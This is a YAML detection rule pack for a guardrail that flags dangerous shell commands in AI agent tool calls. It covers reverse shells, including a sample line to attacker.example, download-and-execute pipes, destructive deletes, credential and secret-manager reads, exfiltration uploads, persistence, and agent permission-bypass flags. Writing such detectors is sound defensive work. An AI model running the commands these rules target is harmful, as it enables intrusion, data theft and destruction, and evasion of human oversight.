version: 1
category: command
rules:
  - id: CMD-REVSHELL-BASH
    tool_call_only: true
    expression: >-
      f.commands.exists(c, c.program in ['nc', 'nc.exe', 'ncat', 'ncat.exe', 'netcat', 'socat'] &&
      (defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CONNECT in c.operations ||
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_LISTEN in c.operations) &&
      f.paths.exists(p, p.command_id == c.id &&
      p.access == defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_EXECUTE) &&
      f.network.exists(n, n.command_id == c.id &&
      n.action in [defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_CONNECT,
      defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_LISTEN] &&
      n.scope in [defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_PUBLIC,
      defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_UNKNOWN]))
    pattern: '(?i)bash\s+-i\s+>&\s*/dev/tcp/'
    title: "Bash reverse shell"
    severity: CRITICAL
    confidence: 0.98
    tags: [execution, reverse-shell]
  - id: CMD-REVSHELL-DEVTCP
    tool_call_only: true
    # Backport of default pack: bash /dev/tcp also accepts hostnames
    # (e.g. exec 5<>/dev/tcp/attacker.example/4444), so match either a
    # dotted-quad IPv4 prefix OR a non-empty hostname-shaped token followed
    # by `/<port>`. The hostname branch demands at least one `.` for precision.
    pattern: '/dev/tcp/(?:\d{1,3}\.\d{1,3}|[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+)/\d+\b'
    title: "Reverse shell via /dev/tcp"
    severity: CRITICAL
    confidence: 0.95
    tags: [execution, reverse-shell]
  - id: CMD-REVSHELL-NC
    tool_call_only: true
    # Backport of default pack: match BOTH netcat reverse-shell orderings:
    #   - destination-first:  nc 1.2.3.4 4444 -e /bin/sh
    #   - flag-first:         nc -e /bin/sh 1.2.3.4 4444
    pattern: '(?i)\b(?:nc|ncat|netcat)\b\s+(?:(?:-[a-zA-Z]*\s+)*\S+\s+\d+\s*(?:-e|--exec)\b|(?:-[a-zA-Z]*\s+)*(?:-e|--exec)\s+\S+\s+\S+\s+\d+\b)'
    title: "Netcat reverse shell with -e"
    severity: CRITICAL
    confidence: 0.95
    tags: [execution, reverse-shell]
  - id: CMD-REVSHELL-PYTHON
    tool_call_only: true
    pattern: '(?i)python[23]?\s+-c\s+.*socket.*connect'
    title: "Python reverse shell"
    severity: CRITICAL
    confidence: 0.90
    tags: [execution, reverse-shell]
  - id: CMD-PIPE-CURL
    tool_call_only: true
    expression: >-
      f.commands.exists(src, src.program in ['invoke-webrequest', 'iwr', 'invoke-restmethod', 'irm'] &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_FETCH in src.operations &&
      f.commands.exists(dst, dst.program in ['invoke-expression', 'iex'] && src.pipeline_id != 0 &&
      src.pipeline_id == dst.pipeline_id)) &&
      f.commands.exists(src, src.program in ['invoke-webrequest', 'iwr', 'invoke-restmethod', 'irm'] &&
      f.data_flows.exists(d, d.from_command_id == src.id &&
      d.from == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDOUT &&
      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDIN)) &&
      f.commands.exists(dst, dst.program in ['invoke-expression', 'iex'] &&
      f.data_flows.exists(d, d.to_command_id == dst.id &&
      d.from == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDOUT &&
      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDIN))
    # Backport of default pack: also match absolute shell paths like
    # `/bin/sh`, `/bin/bash`, `/usr/bin/zsh`, plus the bare `sh`/`bash`/`zsh`.
    pattern: '(?i)\bcurl\b\s+[^|]*\|\s*(?:[/\w]+/)?(?:bash|zsh|sh)\b'
    title: "curl piped to shell"
    severity: CRITICAL
    confidence: 0.95
    tags: [execution, download-exec]
  - id: CMD-PIPE-WGET
    tool_call_only: true
    # Backport of default pack (parity with CMD-PIPE-CURL above).
    pattern: '(?i)\bwget\b\s+[^|]*\|\s*(?:[/\w]+/)?(?:bash|zsh|sh)\b'
    title: "wget piped to shell"
    severity: CRITICAL
    confidence: 0.95
    tags: [execution, download-exec]
  - id: CMD-PIPE-BASE64
    tool_call_only: true
    # Backport of default pack (parity with CMD-PIPE-CURL above).
    pattern: '(?i)base64\s+(?:-[dD]|--decode)\s*\|\s*(?:[/\w]+/)?(?:bash|zsh|sh)\b'
    title: "base64 decode piped to shell"
    severity: CRITICAL
    confidence: 0.95
    tags: [execution, obfuscation]
  - id: CMD-EVAL
    pattern: '(?i)\beval\s+["''\$\(]'
    title: "Shell eval with dynamic input"
    severity: HIGH
    confidence: 0.85
    tags: [execution]
  - id: CMD-BASH-C
    pattern: '(?i)\b(?:ba)?sh\s+-c\s+'
    title: "Shell -c execution"
    severity: LOW
    confidence: 0.55
    tags: [execution]
  - id: CMD-PYTHON-C
    pattern: '(?i)\bpython[23]?\s+-c\s+'
    title: "Python inline execution"
    severity: LOW
    confidence: 0.55
    tags: [execution]
  - id: CMD-PERL-E
    pattern: '(?i)\bperl\s+-e\s+'
    title: "Perl inline execution"
    severity: LOW
    confidence: 0.55
    tags: [execution]
  - id: CMD-RUBY-E
    pattern: '(?i)\bruby\s+-e\s+'
    title: "Ruby inline execution"
    severity: LOW
    confidence: 0.55
    tags: [execution]
  - id: CMD-RM-RF
    pattern: '(?i)\brm\s+(?:-[a-zA-Z]*\s+)*(?:-[a-zA-Z]*)?(?:r[a-zA-Z]*f|f[a-zA-Z]*r)\b(?:\s+\S+)*\s+/(?:$|["''\s,}\]]|(?:etc|bin|sbin|usr|var|home|root|opt|boot|lib(?:64)?|srv|mnt|dev|proc|sys)(?:$|/|["''\s,}\]]))'
    title: "Recursive force delete from critical root path"
    severity: CRITICAL
    confidence: 0.95
    tags: [destructive]
  - id: CMD-MKFS
    pattern: '(?i)\bmkfs\b'
    title: "Filesystem format command"
    severity: CRITICAL
    confidence: 0.90
    tags: [destructive]
  - id: CMD-DD-IF
    pattern: '(?i)\bdd\s+if='
    title: "dd disk write"
    severity: HIGH
    confidence: 0.80
    tags: [destructive]
  - id: CMD-CHMOD-WORLD
    pattern: '(?i)\bchmod\s+[0-7]*[0-7][0-7][2367]\s'
    title: "chmod world-writable"
    severity: HIGH
    confidence: 0.80
    tags: [privilege]
  - id: CMD-CHOWN-ROOT
    pattern: '(?i)\bchown\s+root\b'
    title: "chown to root"
    severity: HIGH
    confidence: 0.75
    tags: [privilege]
  - id: CMD-SUDO
    pattern: '(?i)\bsudo\s+'
    title: "sudo invocation"
    severity: LOW
    confidence: 0.50
    tags: [privilege]
  - id: CMD-ETC-WRITE
    pattern: '(?i)>\s*/etc/'
    title: "Write redirect to /etc/"
    severity: CRITICAL
    confidence: 0.90
    tags: [system-file]
  - id: CMD-CRONTAB
    pattern: '(?i)\bcrontab\s+(?:-[a-zA-Z]\s+)*(?:-e|-r|-l|/|[''"<>|])'
    title: "Crontab modification"
    severity: HIGH
    confidence: 0.75
    tags: [persistence]
  - id: CMD-SYSTEMCTL
    pattern: '(?i)\bsystemctl\s+enable\b(?:\s+--now\b)?\s+\S*(?:backdoor|payload|persist|reverse|shell|evil)\S*(?:\.service)?\b'
    title: "Suspicious systemd persistence enablement"
    severity: CRITICAL
    confidence: 0.82
    tags: [persistence]
  - id: CMD-NETCAT-LISTEN
    pattern: '(?i)\b(?:nc|ncat|netcat)\b\s+(?:-[a-zA-Z]*)*-?l'
    title: "Netcat listener"
    severity: HIGH
    confidence: 0.85
    tags: [network, reverse-shell]
  - id: CMD-CURL-UPLOAD
    tool_call_only: true
    expression: >-
      f.commands.exists(c, defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_UPLOAD in c.operations &&
      f.paths.exists(p, p.command_id == c.id &&
      p.access == defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_READ) &&
      f.network.exists(n, n.command_id == c.id &&
      n.action == defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_UPLOAD &&
      n.scope in [defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_PUBLIC,
      defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_UNKNOWN]) &&
      f.data_flows.exists(d, d.to_command_id == c.id &&
      d.from == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_FILE &&
      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_PROCESS) &&
      f.data_flows.exists(d, d.from_command_id == c.id &&
      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_NETWORK))
    pattern: '(?i)\bcurl\b\s+.*(?:--upload-file|-T\s|--data\s+@|-F\s+.*=@)'
    title: "curl file upload"
    severity: HIGH
    confidence: 0.85
    tags: [network, exfiltration]
  - id: CMD-WGET-POST
    tool_call_only: true
    pattern: '(?i)\bwget\b\s+.*--post-(?:data|file)'
    title: "wget POST data exfil"
    severity: HIGH
    confidence: 0.85
    tags: [network, exfiltration]
  - id: CMD-SOCAT-EXEC
    tool_call_only: true
    pattern: '(?i)\bsocat\b\s+.*\bEXEC\b'
    title: "socat with EXEC (reverse shell)"
    severity: CRITICAL
    confidence: 0.95
    tags: [execution, reverse-shell]
  - id: CMD-ENV-DUMP
    tool_call_only: true
    expression: >-
      f.commands.exists(src, defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_ENVIRONMENT_READ in src.operations &&
      f.commands.exists(dst, defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_UPLOAD in dst.operations &&
      src.pipeline_id != 0 && src.pipeline_id == dst.pipeline_id)) &&
      f.commands.exists(src, defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_ENVIRONMENT_READ in src.operations &&
      f.data_flows.exists(d, d.from_command_id == src.id &&
      d.from == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDOUT &&
      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDIN)) &&
      f.commands.exists(dst, defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_UPLOAD in dst.operations &&
      f.data_flows.exists(d, d.to_command_id == dst.id &&
      d.from == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDOUT &&
      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDIN) &&
      f.network.exists(n, n.command_id == dst.id &&
      n.action == defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_UPLOAD &&
      n.scope in [defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_PUBLIC,
      defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_UNKNOWN]) &&
      f.data_flows.exists(d, d.from_command_id == dst.id &&
      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_NETWORK))
    pattern: '(?i)\b(?:printenv|export\s+-p|env)\b[^|;\n]*\|\s*(?:curl\b[^;\n]*(?:--data(?:-binary|-raw)?\s+@-|--upload-file\s+-|-T\s+-)|wget\b[^;\n]*--post-(?:data|file)(?:=|\s+)@?-)'
    title: "Environment variable dump"
    severity: HIGH
    confidence: 0.80
    tags: [credential]
  - id: secrets.cloud_secret_manager_read
    tool_call_only: true
    expression: >-
      f.commands.exists(c, c.argv_complete &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CREDENTIAL_READ in c.operations &&
      c.program in ['aws', 'gcloud', 'az', 'vault', 'op', 'pass', 'security'])
    pattern: '(?i)\b(?:aws\s+secretsmanager\s+get-secret-value|gcloud\s+secrets\s+versions\s+access|az\s+keyvault\s+secret\s+show|vault\s+kv\s+get|op\s+(?:read|item\s+get)|pass\s+show|security\s+find-(?:generic|internet)-password)\b'
    title: "Cloud secret manager value read"
    severity: CRITICAL
    confidence: 0.94
    tags: [credential, cloud, secret-manager]
  - id: exfil.secret_read_and_egress_oneliner
    tool_call_only: true
    expression: >-
      f.commands.exists(src,
      (defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CREDENTIAL_READ in src.operations ||
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_READ in src.operations) &&
      f.paths.exists(p, p.command_id == src.id &&
      p.access == defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_READ)) &&
      f.commands.exists(src,
      (defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CREDENTIAL_READ in src.operations ||
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_READ in src.operations) &&
      f.commands.exists(dst, defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_UPLOAD in dst.operations &&
      src.pipeline_id != 0 && src.pipeline_id == dst.pipeline_id)) &&
      f.commands.exists(src, f.data_flows.exists(d, d.from_command_id == src.id &&
      d.from == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDOUT &&
      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDIN)) &&
      f.commands.exists(dst, defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_UPLOAD in dst.operations &&
      f.data_flows.exists(d, d.to_command_id == dst.id &&
      d.from == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDOUT &&
      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDIN) &&
      f.network.exists(n, n.command_id == dst.id &&
      n.action == defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_UPLOAD &&
      n.scope in [defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_PUBLIC,
      defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_UNKNOWN]) &&
      f.data_flows.exists(d, d.from_command_id == dst.id &&
      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_NETWORK))
    pattern: '(?i)\b(?:cat|type|Get-Content)\b[^|;\n]*(?:\.env|credentials|\.git-credentials|\.netrc|_netrc|\.npmrc|\.pypirc|config\.json|/token)\s*\|\s*(?:curl\b[^;\n]*(?:--data(?:-binary|-raw)?\s+@-|--upload-file\s+-|-T\s+-)|wget\b[^;\n]*--post-(?:data|file)(?:=|\s+)@?-)'
    title: "Sensitive read piped to external upload"
    severity: CRITICAL
    confidence: 0.96
    tags: [credential, exfiltration, network]
  - id: exec.reverse_tunnel
    tool_call_only: true
    expression: >-
      f.commands.exists(c, c.argv_complete && c.program in ['ssh', 'ssh.exe'] &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_TUNNEL in c.operations &&
      '-F' in c.argv && 'none' in c.argv && '-R' in c.argv && !('-G' in c.argv) &&
      f.network.exists(n, n.command_id == c.id &&
      n.action in [defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_TUNNEL,
      defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_CONNECT] &&
      n.scope in [defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_PUBLIC,
      defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_UNKNOWN]))
    pattern: '(?i)\bssh(?:\.exe)?\b[^;\n]*(?:^|\s)-R(?:\s+|\S)'
    title: "SSH reverse tunnel"
    severity: HIGH
    confidence: 0.90
    tags: [network, tunnel, persistence]
  - id: exec.agent_runtime_bypass_flags
    tool_call_only: true
    expression: >-
      f.commands.exists(c, c.argv_complete &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_POLICY_BYPASS in c.operations)
    pattern: '\b(?:(?i:claude(?:\.exe)?)\b[^;\n]*(?:\s--dangerously-skip-permissions|\s--permission-mode(?:=|\s+)bypassPermissions\b)|(?i:codex(?:\.exe)?)\b[^;\n]*(?:\s--dangerously-bypass-approvals-and-sandbox|\s(?:--sandbox|-s)(?:=|\s+)danger-full-access\b[^;\n]*\s(?:--ask-for-approval|-a)(?:=|\s+)never\b[^;\n]*\s(?:exec|e)\b|\s(?:--ask-for-approval|-a)(?:=|\s+)never\b[^;\n]*\s(?:--sandbox|-s)(?:=|\s+)danger-full-access\b[^;\n]*\s(?:exec|e)\b|\s(?:--ask-for-approval|-a)(?:=|\s+)never\b[^;\n]*\s(?:exec|e)\b[^;\n]*\s(?:--sandbox|-s)(?:=|\s+)danger-full-access\b))'
    title: "Agent runtime safety bypass flags"
    severity: CRITICAL
    confidence: 0.98
    tags: [execution, policy-bypass, agent-runtime]
